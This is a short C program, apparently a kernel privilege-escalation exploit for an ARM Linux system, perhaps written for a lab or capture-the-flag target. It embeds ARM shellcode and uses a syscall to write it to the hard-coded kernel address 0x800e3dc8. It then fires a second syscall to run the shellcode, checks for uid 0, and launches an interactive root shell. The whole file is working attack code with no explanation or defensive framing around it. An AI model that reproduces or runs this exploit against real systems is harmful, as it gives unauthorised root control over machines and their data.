#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>

#define upper_id 223
#define TRIG 343

int main(){
    char sc[] =
    "\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x01\xb5\x92\x1a"
    "\x10\x1c\xf0\x46\x02\x4a\x90\x47\x02\x4a\x1c\x32"
    "\x90\x47\x01\xbd\x24\xf9\x03\x80\x50\xf5\x03\x80";

    void *p = (void*)0x800e3dc8;
    printf("hijacking");
    syscall(upper_id, sc, p);

    syscall(TRIG);
    if(getuid()!=0){
        printf("didnt get root");
        return 1;
    }
    printf("root 👌😁");
    execl("/bin/sh","sh","-i",0);

    return 0;
}
